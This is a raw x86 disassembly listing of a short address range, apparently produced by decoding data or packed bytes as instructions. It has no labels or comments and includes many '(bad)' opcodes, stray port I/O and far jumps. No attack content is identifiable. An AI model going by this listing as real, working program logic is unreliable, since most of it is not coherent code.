  409d3c:	or     al,BYTE PTR [eax]
  409d3e:	nop
  409d3f:	jle    0x409d4d
  409d41:	add    BYTE PTR [eax-0x6fc5f578],dl
  409d47:	jae    0x409d55
  409d49:	dec    ebp
  409d4a:	nop
  409d4b:	xchg   DWORD PTR [edx],ecx
  409d4d:	cmp    edx,DWORD PTR [eax-0x6fb1f390]
  409d53:	test   eax,0xa4904e0a
  409d58:	or     cl,BYTE PTR [esi-0x70]
  409d5b:	jae    0x409d69
  409d5d:	cmp    edx,DWORD PTR [eax-0x6fc4f570]
  409d63:	pop    ss
  409d64:	or     al,0x57
  409d66:	nop
  409d67:	mov    dl,0xa
  409d69:	add    BYTE PTR [eax-0x6fbea5d5],dl
  409d6f:	mov    eax,0xb89041ef
  409d74:	out    dx,eax
  409d75:	inc    ecx
  409d76:	nop
  409d77:	mov    eax,0xb9041ef
  409d7c:	pop    edx
  409d7d:	inc    ecx
  409d7e:	nop
  409d7f:	outs   dx,BYTE PTR ds:[si]
  409d81:	inc    ecx
  409d82:	nop
  409d83:	add    al,0x6e
  409d85:	inc    ecx
  409d86:	nop
  409d87:	aaa    
  409d88:	outs   dx,DWORD PTR ds:[esi]
  409d89:	inc    ecx
  409d8a:	nop
  409d8b:	push   edx
  409d8c:	outs   dx,BYTE PTR ds:[esi]
  409d8d:	inc    ecx
  409d8e:	nop
  409d8f:	aam    0x6e
  409d91:	inc    ecx
  409d92:	nop
  409d93:	bound  ebp,QWORD PTR [esi+0x41]
  409d96:	add    BYTE PTR [eax],al
  409d98:	add    BYTE PTR [eax],al
  409d9a:	add    BYTE PTR [eax-0x6fbe919b],dl
  409da0:	mov    dl,0x33
  409da2:	inc    esi
  409da3:	rcl    BYTE PTR [edx-0x637ccbeb],cl
  409da9:	adc    eax,0xe5b88334
  409dae:	add    edx,DWORD PTR [eax-0x2db9ec4e]
  409db4:	xchg   edx,eax
  409db5:	in     eax,0x3
  409db7:	nop
  409db8:	mov    dl,0xcc
  409dba:	clc    
  409dbb:	addr16 mov dl,0x5d
  409dbe:	adc    edx,esp
  409dc0:	mov    dl,0x8d
  409dc2:	adc    ecx,esp
  409dc4:	mov    dl,0x4c
  409dc6:	fmul   st(7),st
  409dc8:	mov    dl,0xb0
  409dca:	stos   BYTE PTR es:[edi],al
  409dcb:	push   eax
  409dcc:	mov    dl,0xfe
  409dce:	stos   BYTE PTR es:[edi],al
  409dcf:	push   eax
  409dd0:	mov    dl,0x2c
  409dd2:	fdiv   QWORD PTR [edi+0x50aa98b2]
  409dd8:	mov    dl,0xde
  409dda:	stos   BYTE PTR es:[edi],al
  409ddb:	push   eax
  409ddc:	mov    dl,0x52
  409dde:	stos   BYTE PTR es:[edi],al
  409ddf:	push   eax
  409de0:	mov    dl,0xcc
  409de2:	fist   DWORD PTR [edi-0x70242a4e]
  409de8:	mov    dl,0x88
  409dea:	fadd   QWORD PTR [edi+0x50ab14b2]
  409df0:	mov    dl,0x93
  409df2:	scas   al,BYTE PTR es:[edi]
  409df3:	push   eax
  409df4:	mov    dl,0x98
  409df6:	add    eax,DWORD PTR [ecx-0x4e]
  409df9:	test   eax,0xe1b29003
  409dfe:	mov    eax,0x0
  409e03:	add    BYTE PTR [eax-0x4e],dl
  409e06:	std    
  409e07:	add    edx,DWORD PTR [eax-0x6ffc044e]
  409e0d:	mov    dl,0xe9
  409e0f:	add    edx,DWORD PTR [eax-0x6ffc2d4e]
  409e15:	mov    dl,0x75
  409e17:	(bad)  
  409e18:	shl    BYTE PTR [edx-0x4d2f3ab6],1
  409e1e:	push   cs
  409e1f:	and    cl,BYTE PTR [ebp-0xe]
  409e22:	push   cs
  409e23:	xor    DWORD PTR [edi-0x75],eax
  409e26:	push   cs
  409e27:	lods   eax,DWORD PTR ds:[esi]
  409e28:	mov    ecx,DWORD PTR ds:[esi]
  409e2b:	cmp    DWORD PTR [eax+eax*8-0x2573b9f2],edx
  409e32:	push   cs
  409e33:	inc    eax
  409e34:	xchg   esp,eax
  409e35:	ror    BYTE PTR [esi],1
  409e37:	push   eax
  409e38:	mov    esi,es
  409e3a:	push   cs
  409e3b:	and    eax,0x2d0ee694
  409e40:	mov    WORD PTR [edx-0x116c0cf2],?
  409e46:	push   cs
  409e47:	jmp    0x54f50df
  409e4c:	xchg   esp,eax
  409e4d:	(bad)  [esi]
  409e4f:	sbb    cl,BYTE PTR [edx+eax*8-0x2e6c02f2]
  409e56:	push   cs
  409e57:	add    BYTE PTR [esp+edi*8-0x226bf7f2],cl
  409e5e:	push   cs
  409e5f:	or     al,0x8c
  409e61:	mov    dl,0xe
  409e63:	cdq    
  409e64:	xchg   ebx,eax
  409e65:	popa   
  409e66:	(bad)  
  409e68:	add    BYTE PTR [eax],al
  409e6a:	add    BYTE PTR [eax],al
  409e6c:	add    BYTE PTR [ebx-0x6bf3f14e],dl
  409e72:	les    ecx,FWORD PTR [esi]
  409e74:	jmp    0x224f510c
  409e79:	mov    ah,0xf1
  409e7b:	push   cs
  409e7c:	call   0xf1b6:0x3a0ef1ae
  409e83:	push   cs
  409e84:	xchg   edx,eax
  409e85:	retf   
  409e86:	mov    cl,BYTE PTR [esi]
  409e88:	or     al,0xab
  409e8a:	icebp  
  409e8b:	push   cs
  409e8c:	push   es
  409e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8e:	icebp  
  409e8f:	push   cs
  409e90:	jp     0x409f0d
  409e92:	repz push cs
  409e94:	mov    dl,0x6b
  409e96:	mov    cl,BYTE PTR [esi]
  409e98:	sub    al,0x6b
  409e9a:	repz push cs
  409e9c:	add    BYTE PTR [esi+0x57],ch
  409e9f:	dec    edi
  409ea0:	add    BYTE PTR [esi],dl
  409ea2:	shl    BYTE PTR [ebp+0x70],cl
  409ea5:	or     eax,0x152e7bcb
  409eaa:	fisub  DWORD PTR [edx+0x0]
  409ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eae:	fisub  DWORD PTR [ebp+0x70]
  409eb1:	ffree  st(1)
  409eb3:	jnp    0x409f08
  409eb5:	in     eax,0xd5
  409eb7:	jl     0x409f2d
  409eb9:	in     al,0xbe
  409ebb:	push   cs
  409ebc:	add    BYTE PTR [esi-0x26],ah
  409ebf:	gs jo  0x409e9f
  409ec2:	sar    DWORD PTR [ebx+0x53],0xd1
  409ec6:	sar    DWORD PTR [edx+0x64],0x5e
  409eca:	mov    edi,0xda660060
  409ecf:	gs jo  0x409ed2
  409ed2:	add    BYTE PTR [eax],al
  409ed4:	add    BYTE PTR [eax],al
  409ed6:	mov    edx,0xa56169c4
  409edb:	ror    DWORD PTR [ecx+ebp*2-0x5b],1
  409edf:	fldcw  WORD PTR [ebp+0x70]
  409ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ee3:	les    ebx,FWORD PTR [edi+0x6d]
  409ee6:	mov    eax,ds:0xac5445f4
  409eeb:	cmc    
  409eec:	pop    esi
  409eed:	add    BYTE PTR [esi+0x257065da],dh
  409ef3:	fnstsw WORD PTR [ebx+0x70]
  409ef6:	faddp  st(2),st
  409ef8:	imul   ecx,DWORD PTR [ecx-0x34],0xa96567d4
  409eff:	mov    ch,0xe
  409f01:	add    dh,ah
  409f03:	shl    DWORD PTR [ebp+0x70],1
  409f06:	not    al
  409f08:	jp     0x409f53
  409f0a:	int3   
  409f0b:	aam    0x67
  409f0d:	gs hlt 
  409f0f:	xlat   BYTE PTR ds:[ebx]
  409f10:	imul   ebp,DWORD PTR [edi+0x5],0xffffffd1
  409f14:	jl     0x409f89
  409f16:	dec    edx
  409f17:	fdiv   QWORD PTR [ebp+eiz*2-0x70]
  409f1b:	pop    ebx
  409f1c:	or     al,0x0
  409f1e:	nop
  409f1f:	adc    BYTE PTR [eax+0x69],ch
  409f22:	add    BYTE PTR [ecx],bl
  409f24:	imul   esi,DWORD PTR [ecx+ebx*8+0x36],0x16ed676d
  409f2c:	bound  esp,QWORD PTR [ebx-0x11]
  409f2f:	das    
  409f30:	imul   esi,DWORD PTR [edx-0x1d],0x90000c5b
  409f37:	nop
  409f38:	imul   ax,WORD PTR [eax],0x0
  409f3d:	add    BYTE PTR [eax],al
  409f3f:	ror    BYTE PTR [ebx+ebp*2+0x5f92b576],0x61
  409f47:	scas   eax,DWORD PTR es:[edi]
  409f48:	not    BYTE PTR [esi+0x6f]
  409f4b:	ret    
  409f4c:	jg     0x409fca
  409f4e:	gs mov cl,0xee
  409f51:	or     al,BYTE PTR [eax]
  409f53:	nop
  409f54:	mov    esi,0x85755ae7
  409f59:	hlt    
  409f5a:	sub    al,0x55
  409f5c:	(bad)  
  409f5d:	rcr    BYTE PTR [ebx+eax*2-0x76],1
  409f61:	pop    es
  409f62:	out    0xeb,eax
  409f64:	xor    edi,eax
  409f66:	aas    
  409f67:	nop
  409f68:	or     al,0xef
  409f6a:	aas    
  409f6b:	nop
  409f6c:	jmp    0xc:0x6e9040fb
  409f73:	nop
  409f74:	and    al,0xf8
  409f76:	inc    eax
  409f77:	nop
  409f78:	inc    esi
  409f79:	stc    
  409f7a:	inc    eax
  409f7b:	nop
  409f7c:	mov    ah,0xf7
  409f7e:	inc    eax
  409f7f:	nop
  409f80:	jecxz  0x409f80
  409f82:	aas    
  409f83:	nop
  409f84:	(bad)  
  409f85:	inc    BYTE PTR [eax-0x70]
  409f88:	mov    esi,?
  409f8a:	aas    
  409f8b:	nop
  409f8c:	dec    eax
  409f8d:	or     DWORD PTR [edx-0x70],eax
  409f90:	fcmovu st,st(2)
  409f92:	aas    
  409f93:	nop
  409f94:	leave  
  409f95:	inc    DWORD PTR [ecx-0x70]
  409f98:	mov    dl,0xc1
  409f9a:	fcmovne st,st(7)
  409f9c:	mov    dl,0x6d
  409f9e:	aam    0xc7
  409fa0:	mov    dl,0x63
  409fa2:	sldt   WORD PTR [eax]
  409fa5:	add    BYTE PTR [eax],al
  409fa7:	add    dl,dl
  409fa9:	mov    dl,0xed
  409fab:	add    edx,DWORD PTR [eax-0x6ffc014e]
  409fb1:	mov    dl,0xfb
  409fb3:	add    edx,DWORD PTR [eax-0x6ffc134e]
  409fb9:	mov    dl,0xd1
  409fbb:	add    edx,DWORD PTR [eax-0x6ffc054e]
  409fc1:	mov    dl,0xe4
  409fc3:	add    edx,DWORD PTR [eax-0x6ffc1e4e]
  409fc9:	mov    dl,0xea
  409fcb:	add    edx,DWORD PTR [eax-0x6ffc204e]
  409fd1:	mov    dl,0xe8
  409fd3:	add    edx,DWORD PTR [eax-0x2f42544e]
  409fd9:	mov    dl,0xab
  409fdb:	mov    ebp,0xbdc7b2d0
  409fe0:	push   eax
  409fe1:	mov    dl,0x4c
  409fe3:	fadd   st(7),st
  409fe5:	mov    dl,0x24
  409fe7:	adc    edx,DWORD PTR [edx-0x4e]
  409fea:	push   0x13
  409fec:	push   edx
  409fed:	mov    dl,0x2c
  409fef:	fsubr  QWORD PTR [edi+0x521324b2]
  409ff5:	mov    dl,0x62
  409ff7:	adc    edx,DWORD PTR [edx-0x4e]
  409ffa:	jle    0x40a00e
  409ffc:	push   edx
  409ffd:	mov    dl,0xa1
  409fff:	inc    eax
  40a000:	pop    esp
  40a001:	in     eax,dx
  40a002:	mov    ecx,0xa0b29040
  40a007:	inc    eax
  40a008:	fs mov dl,0xad
  40a00b:	inc    eax
  40a00c:	add    BYTE PTR [eax],al
  40a00e:	add    BYTE PTR [eax],al
  40a010:	add    BYTE PTR [ecx-0x12],dl
  40a013:	in     eax,0x3
  40a015:	nop
  40a016:	mov    dl,0x95
  40a018:	dec    edx
  40a019:	inc    ebx
  40a01a:	fimul  WORD PTR [esi]
  40a01c:	jmp    0x994f52b4
  40a021:	inc    eax
  40a022:	fimul  WORD PTR [esi]
  40a024:	stos   BYTE PTR es:[edi],al
  40a025:	(bad)  
  40a027:	inc    eax
  40a028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a029:	into   
  40a02a:	fimul  WORD PTR [esi]
  40a02c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a02d:	jecxz  0x40a00d
  40a02f:	inc    ebp
  40a030:	sahf   
  40a031:	leave  
  40a032:	jecxz  0x40a042
  40a034:	popf   
  40a035:	(bad)
  40a038:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a039:	xchg   ebx,eax
  40a03a:	mov    dl,0xe
  40a03c:	stos   BYTE PTR es:[edi],al
  40a03d:	retf   0x55e2
  40a040:	jmp    0x354f52d8
  40a045:	fcomi  st,st(3)
  40a047:	inc    ebx
  40a048:	jmp    0x244f52e0
  40a04d:	iret   
  40a04e:	repz aas 
  40a050:	sbb    eax,0x340eb28c
  40a055:	fneni(8087 only) 
  40a057:	dec    ecx
  40a058:	jmp    0x194f52f0
  40a05d:	(bad)  
  40a05e:	neg    DWORD PTR [esi+0x27]
  40a061:	(bad)  
  40a064:	jmp    0x394f52fc
  40a069:	pop    esi
  40a06a:	neg    DWORD PTR [esi+0x39]
  40a06d:	push   ebp
  40a06e:	fimul  WORD PTR [ebx+0x21]
  40a071:	mov    WORD PTR [edx+0x1a0e],?
  40a077:	add    BYTE PTR [eax],al
  40a079:	add    BYTE PTR [ecx-0xf],dl
  40a07c:	pop    esp
  40a07d:	sub    dl,BYTE PTR [edx+esi*4+0xe]
  40a081:	sbb    al,0x4a
  40a083:	idiv   BYTE PTR [edi]
  40a085:	sub    al,BYTE PTR [edi-0x4e]
  40a088:	push   cs
  40a089:	mov    ebx,0xbb3fe250
  40a08e:	push   edi
  40a08f:	mov    dl,0xe
  40a091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a092:	dec    esi
  40a093:	icebp  
  40a094:	dec    ebx
  40a095:	mov    ch,0x44
  40a097:	loopne 0x40a0de
  40a099:	add    BYTE PTR ds:0xfa000ee6,cl
  40a09f:	cli    
  40a0a0:	dec    ecx
  40a0a1:	inc    ebx
  40a0a2:	repnz sti 
  40a0a4:	pop    ecx
  40a0a5:	push   esp
  40a0a6:	test   eax,0x44000eb2
  40a0ab:	repz pop esp
  40a0ad:	inc    edi
  40a0ae:	sub    al,0xb2
  40a0b0:	push   cs
  40a0b1:	add    BYTE PTR [ebx+ebx*4],dh
  40a0b4:	pop    ebx
  40a0b5:	inc    ebp
  40a0b6:	sub    al,ah
  40a0b8:	dec    ebx
  40a0b9:	dec    eax
  40a0ba:	jns    0x40a06e
  40a0bc:	push   cs
  40a0bd:	add    BYTE PTR [edi],dh
  40a0bf:	stc    
  40a0c0:	pop    edx
  40a0c1:	dec    ecx
  40a0c2:	das    
  40a0c3:	out    0xe,eax
  40a0c5:	add    dl,bh
  40a0c7:	loop   0x40a115
  40a0c9:	push   ebx
  40a0ca:	jp     0x40a0a8
  40a0cc:	inc    ebp
  40a0cd:	inc    edx
  40a0ce:	ins    BYTE PTR es:[edi],dx
  40a0cf:	scas   al,BYTE PTR es:[edi]
  40a0d0:	push   cs
  40a0d1:	add    BYTE PTR [eax+edi*8+0x5b],bh
  40a0d5:	push   ebp
  40a0d6:	imul   ebx,edi,0x4b
  40a0d9:	push   edx
  40a0da:	pusha  
  40a0db:	in     al,dx
  40a0dc:	dec    ecx
  40a0dd:	add    BYTE PTR [eax],al
  40a0df:	add    BYTE PTR [eax],al
  40a0e1:	add    BYTE PTR [eax],al
  40a0e3:	mov    ecx,esi
  40a0e5:	pop    edx
  40a0e6:	inc    ebx
  40a0e7:	jno    0x40a097
  40a0e9:	push   cs
  40a0ea:	add    BYTE PTR [ecx-0xb],bh
  40a0ed:	pop    esp
  40a0ee:	inc    edi
  40a0ef:	mov    esp,0x9a000eae
  40a0f4:	(bad)  [eax+0x6e]
  40a0f7:	mov    edi,cs
  40a0f9:	jp     0x40a164
  40a0fb:	neg    bl
  40a0fd:	push   cs
  40a0fe:	add    cl,ch
  40a100:	mov    edi,0x8d90785f
  40a105:	imul   ebp,DWORD PTR [edi-0x69],0xffffffd8
  40a109:	imul   esp,DWORD PTR [ebx-0x23],0xb96e5fd8
  40a110:	mov    cl,0xe
  40a112:	add    dl,bl
  40a114:	fisub  DWORD PTR [eax+0x74]
  40a117:	nop
  40a118:	jbe    0x40a180
  40a11a:	je     0x40a181
  40a11c:	pop    es
  40a11d:	push   ecx
  40a11e:	outs   dx,BYTE PTR ds:[esi]
  40a11f:	aaa    
  40a120:	pop    es
  40a121:	add    BYTE PTR fs:[eax+0x2e6179ff],dl
  40a128:	or     BYTE PTR [esi+0x65],ch
  40a12b:	and    al,BYTE PTR [esi+0x51]
  40a12e:	outs   dx,BYTE PTR ds:[esi]
  40a12f:	repz sbb al,0x50
  40a132:	imul   esi,esi,0x90000c2c
  40a138:	es jl  0x40a1a2
  40a13b:	add    bh,BYTE PTR [ebx]
  40a13d:	push   eax
  40a13e:	gs nop
  40a140:	cmp    BYTE PTR [ebp+esi*2-0xa],ah
  40a144:	and    BYTE PTR [ecx+0x64],dl
  40a147:	add    BYTE PTR [eax],al
  40a149:	add    BYTE PTR [eax],al
  40a14b:	add    BYTE PTR [eax-0x1f9aaed0],dl
  40a151:	push   es
  40a152:	ins    DWORD PTR es:[edi],dx
  40a153:	ins    BYTE PTR es:[edi],dx
  40a154:	mov    ecx,0x90004fe5
  40a159:	clc    
  40a15a:	outs   dx,WORD PTR ds:[esi]
  40a15c:	ret    
  40a15d:	test   BYTE PTR [edx],0x0
  40a160:	nop
  40a161:	fcmovu st,st(6)
  40a163:	aas    
  40a164:	nop
  40a165:	ins    DWORD PTR es:[edi],dx
  40a166:	fistp  QWORD PTR [edi]
  40a168:	nop
  40a169:	scas   eax,DWORD PTR es:[edi]
  40a16a:	sar    BYTE PTR [edi],cl
  40a16c:	nop
  40a16d:	ret    
  40a16e:	fidivr WORD PTR [edi]
  40a170:	nop
  40a171:	pandn  mm7,QWORD PTR [edi]
  40a174:	nop
  40a175:	fcmovbe st,st(5)
  40a177:	aas    
  40a178:	nop
  40a179:	inc    ebp
  40a17a:	dec    ebp
  40a17b:	inc    edx
  40a17c:	nop
  40a17d:	(bad)  
  40a17e:	dec    esp
  40a17f:	inc    edx
  40a180:	nop
  40a181:	fsub   st(6),st
  40a183:	aas    
  40a184:	nop
  40a185:	xchg   DWORD PTR [edx+eax*2-0x70],ecx
  40a189:	xchg   esi,eax
  40a18a:	dec    eax
  40a18b:	inc    edx
  40a18c:	nop
  40a18d:	test   al,0x48
  40a18f:	inc    edx
  40a190:	nop
  40a191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a192:	or     bl,BYTE PTR [ecx-0x70]
  40a195:	mov    dl,0xe5
  40a197:	add    edx,DWORD PTR [eax+0x4403ffb2]
  40a19d:	mov    dl,0xdd
  40a19f:	add    edi,DWORD PTR [edx+esi*4]
  40a1a2:	in     eax,0x3
  40a1a4:	nop
  40a1a5:	mov    dl,0xc6
  40a1a7:	pop    esi
  40a1a8:	cmp    ebp,edx
  40a1aa:	mov    edx,0xc3b2907a
  40a1af:	add    BYTE PTR fs:[eax],al
  40a1b2:	add    BYTE PTR [eax],al
  40a1b4:	add    BYTE PTR [esp+ecx*8],ch
  40a1b7:	enter  0xfa6b,0xd7
  40a1bb:	cdq    
  40a1bc:	data16 test dl,0x96
  40a1c0:	jne    0x40a1c5
  40a1c2:	mov    edi,0xc8f8708f
  40a1c7:	mov    eax,ds:0x86b2c603
  40a1cc:	add    esp,edx
  40a1ce:	mov    dl,0xa7
  40a1d0:	add    ebp,ecx
  40a1d2:	mov    dl,0x89
  40a1d4:	add    ebp,ebp
  40a1d6:	mov    dl,0xae
  40a1d8:	add    edi,DWORD PTR [esi-0x48fbc04e]
  40a1de:	mov    dl,0x31
  40a1e0:	add    al,0xe4
  40a1e2:	mov    dl,0x53
  40a1e4:	add    al,0xb1
  40a1e6:	mov    dl,0x2f
  40a1e8:	add    al,0xa3
  40a1ea:	mov    dl,0x59
  40a1ec:	add    al,0xb1
  40a1ee:	mov    dl,0x39
  40a1f0:	add    al,0xa9
  40a1f2:	mov    dl,0x48
  40a1f4:	add    al,0xa6
  40a1f6:	mov    dl,0xe5
  40a1f8:	add    edx,DWORD PTR [eax+0x630449b2]
  40a1fe:	mov    dl,0x19
  40a200:	add    al,0x82
  40a202:	mov    dl,0xe
  40a204:	add    al,0x66
  40a206:	mov    dl,0x8
  40a208:	add    al,0x56
  40a20a:	mov    dl,0x1e
  40a20c:	add    al,0x74
  40a20e:	mov    dl,0xa
  40a210:	add    al,0x49
  40a212:	mov    dl,0xe
  40a214:	pop    es
  40a215:	mov    esp,cs
  40a217:	push   cs
  40a218:	inc    BYTE PTR [eax]
  40a21a:	add    BYTE PTR [eax],al
  40a21c:	add    BYTE PTR [eax],al
  40a21e:	xchg   ebx,eax
  40a21f:	out    0xe,al
  40a221:	or     al,0x8c
  40a223:	or     BYTE PTR [esi],0x15
  40a226:	xchg   esp,eax
  40a227:	retf   0xc0e
  40a22a:	mov    WORD PTR [edx-0x356beaf2],es
  40a230:	push   cs
  40a231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a232:	xchg   ebx,eax
  40a233:	lea    ecx,[esi]
  40a235:	mov    edx,0x970eb293
  40a23a:	inc    ebx
  40a23b:	lock push cs
  40a23d:	jmp    0xa54f54d5
  40a242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a243:	mov    gs,WORD PTR [edx]
  40a245:	pushf  
  40a246:	add    eax,eax
  40a248:	jp     0x40a1e6
  40a24a:	in     eax,0xbb
  40a24c:	jbe    0x40a1de
  40a24e:	jmp    0x880dcd1a
  40a253:	mov    gs,WORD PTR [edx]
  40a255:	lds    edi,FWORD PTR [edi-0x7c]
  40a258:	das    
  40a259:	test   eax,0xa54bf0cc
  40a25e:	shr    ah,1
  40a260:	inc    edi
  40a261:	xor    ebp,edx
  40a263:	clc    
  40a264:	inc    ebx
  40a265:	sub    eax,0x393ff4c9
  40a26a:	fucom  st(0)
  40a26c:	pop    ebx
  40a26d:	xor    eax,0xd57dcc1
  40a272:	jo     0x40a202
  40a274:	sub    al,BYTE PTR ds:0x1355ea70
  40a27a:	mov    ebx,0x670f51e6
  40a27f:	shr    BYTE PTR [ebp+0xb],cl
  40a282:	add    BYTE PTR [eax],al
  40a284:	add    BYTE PTR [eax],al
  40a286:	add    BYTE PTR [ebx-0x32],dh
  40a289:	imul   eax,DWORD PTR [edi],0x365da5f
  40a28f:	imul   edx,esi,0x61
  40a292:	push   DWORD PTR [esi-0x3e]
  40a295:	jge    0x40a297
  40a297:	stc    
  40a298:	scas   al,BYTE PTR es:[edi]
  40a299:	push   cs
  40a29a:	add    cl,ch
  40a29c:	scas   al,BYTE PTR es:[edi]
  40a29d:	push   cs
  40a29e:	add    BYTE PTR [eax+0x74444bf0],ch
  40a2a4:	test   BYTE PTR [edi+0x48],al
  40a2a7:	add    cl,bh
  40a2a9:	inc    ebx
  40a2aa:	dec    esp
  40a2ab:	in     al,dx
  40a2ac:	in     al,dx
  40a2ad:	aas    
  40a2ae:	push   eax
  40a2af:	clc    
  40a2b0:	loopne 0x40a30d
  40a2b2:	push   esp
  40a2b3:	in     al,0xf4
  40a2b5:	push   edi
  40a2b6:	pop    eax
  40a2b7:	lock call 0xe30b052a
  40a2bd:	imul   esp,DWORD PTR [esi-0x3a],0x526a65d6
  40a2c4:	fisub  DWORD PTR [ecx+0x6e]
  40a2c7:	push   ds
  40a2c8:	(bad)  
  40a2c9:	jge    0x40a33d
  40a2cb:	sbb    dl,dl
  40a2cd:	jns    0x40a345
  40a2cf:	push   ss
  40a2d0:	mov    esi,0x87497a75
  40a2d5:	cmp    al,0x33
  40a2d7:	and    eax,0x51373883
  40a2dc:	jg     0x40a301
  40a2de:	das    
  40a2df:	imul   esi,DWORD PTR [esi-0x49d5fff2],0xb6850069
  40a2e9:	imul   eax,DWORD PTR [eax],0x0
  40a2ec:	add    BYTE PTR [eax],al
  40a2ee:	add    BYTE PTR [eax],al
  40a2f0:	retf   
  40a2f1:	mov    dh,0x5e
  40a2f3:	add    bl,bl
  40a2f5:	mov    dh,0x65
  40a2f7:	add    bh,al
  40a2f9:	mov    dh,0x65
  40a2fb:	add    BYTE PTR [ebp-0x29ff964a],bh
  40a301:	mov    dh,0x69
  40a303:	add    BYTE PTR [ecx],ch
  40a305:	mov    dh,0xe
  40a307:	add    BYTE PTR [edi],cl
  40a309:	mov    dh,0x69
  40a30b:	add    BYTE PTR [ecx-0x16ff964a],dh
  40a311:	mov    ch,0xe
  40a313:	add    BYTE PTR [eax-0x6fb6f571],dl
  40a319:	jl     0x40a325
  40a31b:	push   eax
  40a31c:	nop
  40a31d:	xchg   DWORD PTR [edx],ecx
  40a31f:	inc    ecx
  40a320:	nop
  40a321:	xchg   edx,eax
  40a322:	or     al,BYTE PTR [eax]
  40a324:	nop
  40a325:	jp     0x40a3a4
  40a327:	inc    edx
  40a328:	nop
  40a329:	jb     0x40a3a1
  40a32b:	inc    edx
  40a32c:	nop
  40a32d:	test   al,0x74
  40a32f:	inc    edx
  40a330:	nop
  40a331:	retf   0x3fc1
  40a334:	nop
  40a335:	jmp    0xb7d0e2fb
  40a33a:	sar    BYTE PTR [edi],cl
  40a33c:	nop
  40a33d:	popf   
  40a33e:	jo     0x40a381
  40a340:	nop
  40a341:	icebp  
  40a342:	jo     0x40a385
  40a344:	nop
  40a345:	call   0x4ad0e4b9
  40a34a:	(bad)  
  40a34c:	nop
  40a34d:	adc    BYTE PTR [ecx],dh
  40a34f:	push   esp
  40a350:	mov    al,0x4b
  40a352:	or     al,0x0
  40a354:	add    BYTE PTR [eax],al
  40a356:	add    BYTE PTR [eax],al
  40a358:	add    BYTE PTR [eax-0x3bacb505],dl
  40a35e:	imul   ecx,DWORD PTR [eax+eax*1],0xffffff90
  40a362:	sub    eax,0x2390007e
  40a367:	jle    0x40a369
  40a369:	nop
  40a36a:	mov    edi,0xc790007d
  40a36f:	dec    edi
  40a370:	add    BYTE PTR [eax-0x6f899c11],dl
  40a376:	jecxz  0x40a3b3
  40a378:	add    BYTE PTR [eax-0x6fffc30d],dl
  40a37e:	repz cmp eax,0x3ee39000
  40a384:	add    BYTE PTR [eax-0x6fffe01d],dl
  40a38a:	repz and BYTE PTR [eax],al
  40a38d:	nop
  40a38e:	jg     0x40a3f3
  40a390:	add    BYTE PTR [eax-0x7d9eeb4e],dl
  40a396:	retf   
  40a397:	adc    eax,0x7b29070
  40a39c:	bound  esp,QWORD PTR [ebx-0x3e]
  40a39f:	fadd   QWORD PTR [ebx]
  40a3a1:	nop
  40a3a2:	mov    dl,0xfb
  40a3a4:	or     DWORD PTR [edx-0x75f6046e],ecx
  40a3aa:	lods   al,BYTE PTR ds:[esi]
  40a3ab:	jmp    0x40a3b6
  40a3ad:	call   0xe4b4:0x9201e3ac
  40a3b4:	add    DWORD PTR [edx-0x6dfe1c4c],edx
  40a3ba:	mov    ah,0xc4
  40a3bc:	test   al,0x0
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	add    BYTE PTR [eax],al
  40a3c2:	push   ecx
  40a3c3:	mov    dl,0xe3
  40a3c5:	add    edx,DWORD PTR [eax-0x6ffc1a4e]
  40a3cb:	mov    dl,0xe6
  40a3cd:	add    edx,DWORD PTR [eax-0x1eae574e]
  40a3d3:	out    0xf1,al
  40a3d5:	xor    BYTE PTR [edi-0x6ffc1a7f],dh
  40a3db:	mov    dl,0x43
  40a3dd:	jle    0x40a3e6
  40a3df:	cmp    DWORD PTR [eax],edi
  40a3e1:	mov    al,0x5
  40a3e3:	es ja  0x40a36f
  40a3e6:	addr16 inc eax
  40a3e8:	push   esi
  40a3e9:	lods   eax,DWORD PTR ds:[esi]
  40a3ea:	sub    BYTE PTR [eax],dl
  40a3ec:	out    0x3,al
  40a3ee:	nop
  40a3ef:	mov    dl,0x1a
  40a3f1:	repz inc ecx
  40a3f3:	dec    edx
  40a3f4:	loope  0x40a3e3
  40a3f6:	cmp    eax,DWORD PTR [edi]
  40a3f8:	int3   
  40a3f9:	idiv   BYTE PTR [ecx]
  40a3fb:	inc    ebp
  40a3fc:	enter  0x37ef,0x40
  40a400:	mov    dl,0xed
  40a402:	sub    dl,BYTE PTR [ebx-0x28]
  40a405:	lock sub al,0xfe
  40a408:	mov    esp,0xe63a2ceb
  40a40d:	add    edx,DWORD PTR [eax-0x471ef14e]
  40a413:	xchg   edi,eax
  40a414:	xor    al,BYTE PTR [ebx]
  40a416:	lods   al,BYTE PTR ds:[esi]
  40a417:	jns    0x40a486
  40a419:	out    dx,eax
  40a41a:	lahf   
  40a41b:	xchg   esp,eax
  40a41c:	pop    ds
  40a41d:	retf   0x8bb2
  40a420:	sub    ebp,ecx
  40a422:	xchg   ebx,eax
  40a423:	mov    dl,0xe
  40a425:	xor    DWORD PTR [eax],eax
  40a427:	add    BYTE PTR [eax],al
  40a429:	add    BYTE PTR [eax],al
  40a42b:	ja     0x40a3e7
  40a42d:	outs   dx,DWORD PTR ds:[esi]
  40a42e:	adc    al,0x3c
  40a430:	test   BYTE PTR [ebx-0x2],dl
  40a433:	pop    esi
  40a434:	mov    esi,0xc23df578
  40a439:	push   cs
  40a43a:	test   edi,ecx
  40a43c:	shr    BYTE PTR fs:[esi],cl
  40a43f:	out    0x64,eax
  40a441:	retf   0xc074
  40a444:	arpl   di,dx
  40a446:	cmp    bl,ch
  40a448:	push   0xb28c26de
  40a44d:	push   cs
  40a44e:	push   edx
  40a44f:	rcr    DWORD PTR [esi-0x30],0x2e
  40a453:	lds    ebp,FWORD PTR [esi+0xf]
  40a456:	or     ch,al
  40a458:	mov    dl,0xe
  40a45a:	mov    dh,0x8e
  40a45c:	iret   
  40a45d:	pop    edi
  40a45e:	jmp    0x794f56f6
  40a463:	inc    edx
  40a464:	inc    ebp
